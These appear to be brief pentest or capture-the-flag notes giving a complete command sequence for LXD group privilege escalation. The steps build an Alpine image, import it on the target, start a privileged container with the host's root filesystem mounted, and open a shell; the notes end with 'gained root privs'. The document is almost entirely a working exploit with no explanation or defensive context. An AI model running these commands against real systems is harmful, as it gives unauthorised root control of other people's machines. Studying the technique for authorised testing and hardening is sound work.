
1. git clone https://github.com/saghul/lxd-alpine-builder.git  
cd lxd-alpine-builder  
sudo ./build-alpine  

2. upload it to target machine

lxd init
3. lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias alpine
lxc image list
lxc storage create default dir (if needed)
lxc init alpine mycontainer -c security.privileged=true -s default
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh

--> gained root privs.